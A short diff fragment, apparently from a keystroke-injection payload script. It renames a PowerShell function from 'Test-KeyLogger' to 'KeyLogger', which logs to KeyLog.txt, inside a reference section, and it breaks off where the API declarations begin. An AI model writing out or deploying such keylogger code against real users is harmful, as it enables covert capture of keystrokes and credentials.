@@ -229,7 +229,7 @@ ENTER
 DELAY 100
 
 ----Powershell Script---- FYI, you do not need to do anything with this, this is just for reference
-function Test-KeyLogger($logPath="KeyLog.txt") 
+function KeyLogger($logPath="KeyLog.txt") 
 {
   # API declaration
   $APIsignatures = @'
